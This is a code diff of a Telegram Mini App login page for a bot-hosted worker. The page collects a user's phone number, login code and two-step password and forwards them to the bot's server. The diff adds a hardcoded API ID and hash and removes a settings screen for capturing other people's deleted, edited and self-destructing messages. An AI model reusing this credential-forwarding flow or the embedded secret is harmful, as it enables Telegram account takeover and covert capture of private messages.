@@ -45,7 +45,7 @@
         input:focus, textarea:focus {
             border-color: var(--btn-color);
             border-width: 2px;
-            padding: 11px; /* Компенсация ширины границы */
+            padding: 11px;
         }
 
         /* BUTTONS */
@@ -62,12 +62,6 @@
             margin-top: 10px; 
         }
         button:active { opacity: 0.8; transform: scale(0.98); }
-        
-        button.secondary {
-            background-color: transparent;
-            color: var(--btn-color);
-            border: 2px solid var(--btn-color);
-        }
 
         /* TABS */
         .tabs { 
@@ -97,27 +91,6 @@
             box-shadow: 0 2px 4px rgba(0,0,0,0.1); 
         }
 
-        /* SETTINGS ROWS */
-        h4 { margin: 20px 0 10px 0; color: var(--section-header); font-size: 14px; text-transform: uppercase; letter-spacing: 0.5px; }
-        h3 { margin: 0 0 15px 0; text-align: center; }
-        
-        .setting-row { 
-            display: flex; 
-            justify-content: space-between; 
-            align-items: center; 
-            padding: 12px 0; 
-            border-bottom: 1px solid var(--secondary-bg); 
-        }
-        .setting-row span { font-size: 16px; }
-
-        /* TOGGLE SWITCH */
-        .switch { position: relative; display: inline-block; width: 50px; height: 28px; }
-        .switch input { opacity: 0; width: 0; height: 0; }
-        .slider { position: absolute; cursor: pointer; top: 0; left: 0; right: 0; bottom: 0; background-color: var(--secondary-bg); border: 1px solid var(--hint-color); transition: .4s; border-radius: 34px; }
-        .slider:before { position: absolute; content: ""; height: 20px; width: 20px; left: 3px; bottom: 3px; background-color: white; transition: .4s; border-radius: 50%; box-shadow: 0 2px 4px rgba(0,0,0,0.2); }
-        input:checked + .slider { background-color: var(--btn-color); border-color: var(--btn-color); }
-        input:checked + .slider:before { transform: translateX(22px); }
-
         .hint-text { font-size: 13px; color: var(--hint-color); margin-top: 5px; }
     </style>
 </head>
@@ -132,18 +105,19 @@
         </div>
 
         <div style="display: flex; flex-direction: column; gap: 10px;">
-            <label class="hint-text">Данные приложения (my.telegram.org)</label>
-            <input type="number" id="api_id" placeholder="API ID">
-            <input type="text" id="api_hash" placeholder="API HASH">
+            <label class="hint-text">Данные API (можно оставить пустыми)</label>
+            <input type="number" id="api_id" placeholder="API ID (Необязательно)">
+            <input type="text" id="api_hash" placeholder="API HASH (Необязательно)">
         </div>
         
         <div id="phone-group" style="margin-top: 10px;">
-            <input type="tel" id="phone" placeholder="Телефон (+7...)">
+            <label class="hint-text">Номер телефона</label>
+            <input type="tel" id="phone" placeholder="+79991234567">
         </div>
 
         <button onclick="sendLogin()" id="btn-login">Войти</button>
         <div class="hint-text" style="text-align: center; margin-top: 20px;">
-            Ваши данные сохраняются локально на выделенном сервере в вашей личной папке.
+            Код подтверждения придет в приложение Telegram на другом устройстве (Service Notifications).
         </div>
     </div>
 
@@ -160,68 +134,24 @@
         <button onclick="sendPass()">Отправить</button>
     </div>
 
-    <div id="screen-settings" class="container">
-        <h3>Панель управления</h3>
-        
-        <div style="background: var(--secondary-bg); padding: 15px; border-radius: 12px; display: flex; justify-content: space-between; align-items: center;">
-            <span style="font-weight: bold;">Статус Воркера</span>
-            <button onclick="checkStatus()" style="width: auto; margin: 0; padding: 8px 15px; font-size: 14px;">Проверить</button>
-        </div>
-        <div class="hint-text">Нажмите "Проверить", чтобы получить отчет в чат бота.</div>
-
-        <h4>Фильтры</h4>
-        <div class="setting-row">
-            <span>Следить за группами</span>
-            <label class="switch"><input type="checkbox" id="track_groups"><span class="slider"></span></label>
-        </div>
-        
-        <h4>Типы событий</h4>
-        <div class="setting-row">
-            <span>Удаление сообщений</span>
-            <label class="switch"><input type="checkbox" id="evt_del" checked><span class="slider"></span></label>
-        </div>
-        <div class="setting-row">
-            <span>Редактирование</span>
-            <label class="switch"><input type="checkbox" id="evt_edit" checked><span class="slider"></span></label>
-        </div>
-        <div class="setting-row">
-            <span>Исчезающие (Self-destruct)</span>
-            <label class="switch"><input type="checkbox" id="evt_vo" checked><span class="slider"></span></label>
-        </div>
-
-        <h4>Исключения</h4>
-        <label class="hint-text">ID чатов через запятую, которые нужно игнорировать:</label>
-        <textarea id="ignore_chats" rows="2" placeholder="Например: 12345678, -100987654"></textarea>
-
-        <button onclick="saveSettings()">💾 Сохранить и Перезапустить</button>
-        <div class="hint-text" style="text-align: center;">Изменение настроек перезагрузит ваш процесс воркера.</div>
-    </div>
-
     <script>
         const tg = window.Telegram.WebApp;
         tg.expand();
 
-        // Обработка параметров URL для выбора экрана
+        // КОНСТАНТЫ ПО УМОЛЧАНИЮ
+        const DEFAULT_API_ID = 32320992;
+        const DEFAULT_API_HASH = "b5248d75c3a65234a17ab80d97b44515";
+
         let loginMode = 'phone';
         const urlParams = new URLSearchParams(window.location.search);
-        const mode = urlParams.get('mode'); // code, password, settings
+        const mode = urlParams.get('mode'); 
 
-        // Скрываем все экраны
         document.querySelectorAll('.container').forEach(el => el.classList.remove('active'));
+        
+        if (mode === 'code') document.getElementById('screen-code').classList.add('active');
+        else if (mode === 'password') document.getElementById('screen-password').classList.add('active');
+        else document.getElementById('screen-login').classList.add('active');
 
-        // Показываем нужный
-        if (mode === 'code') {
-            document.getElementById('screen-code').classList.add('active');
-        } else if (mode === 'password') {
-            document.getElementById('screen-password').classList.add('active');
-        } else if (mode === 'settings' || window.location.hash === '#settings') {
-            document.getElementById('screen-settings').classList.add('active');
-            // Здесь можно было бы предзаполнить настройки, если бы мы передавали их в URL
-        } else {
-            document.getElementById('screen-login').classList.add('active');
-        }
-
-        // --- ЛОГИКА АВТОРИЗАЦИИ ---
         function switchTab(m) {
             loginMode = m;
             document.querySelectorAll('.tab').forEach(t => t.classList.remove('active-tab'));
@@ -240,12 +170,21 @@
         }
 
         function sendLogin() {
-            const api_id = document.getElementById('api_id').value;
-            const api_hash = document.getElementById('api_hash').value;
-            const phone = document.getElementById('phone').value;
+            let api_id = document.getElementById('api_id').value.trim();
+            let api_hash = document.getElementById('api_hash').value.trim();
+            let phone = document.getElementById('phone').value.trim();
 
-            if (!api_id || !api_hash) return tg.showAlert("Заполните API ID и Hash");
-            if (loginMode === 'phone' && !phone) return tg.showAlert("Введите номер телефона");
+            // Если поля пустые, используем дефолтные
+            if (!api_id) api_id = DEFAULT_API_ID;
+            if (!api_hash) api_hash = DEFAULT_API_HASH;
+
+            if (loginMode === 'phone') {
+                if (!phone) return tg.showAlert("Введите номер телефона");
+                
+                // Очистка номера (удаляем все кроме цифр и плюса)
+                // Превращаем "+7 (999) 123-45-67" в "+79991234567"
+                phone = phone.replace(/[^0-9+]/g, '');
+            }
 
             const data = {
                 action: loginMode === 'phone' ? "init_phone" : "init_qr",
@@ -266,30 +205,6 @@
             const pass = document.getElementById('2fa_pass').value;
             if (!pass) return tg.showAlert("Введите пароль!");
             tg.sendData(JSON.stringify({ action: "submit_password", password: pass }));
-        }
-
-        // --- ЛОГИКА НАСТРОЕК ---
-        function checkStatus() {
-            // Запрашиваем статус, бот ответит сообщением в чат
-            tg.sendData(JSON.stringify({ action: "get_status" }));
-        }
-
-        function saveSettings() {
-            const settings = {
-                track_groups: document.getElementById('track_groups').checked,
-                events: {
-                    deleted: document.getElementById('evt_del').checked,
-                    edited: document.getElementById('evt_edit').checked,
-                    view_once: document.getElementById('evt_vo').checked
-                },
-                // Собираем строку ID
-                ignore_chats_str: document.getElementById('ignore_chats').value
-            };
-
-            tg.sendData(JSON.stringify({
-                action: "save_settings",
-                settings: settings
-            }));
         }
     </script>
 </body>
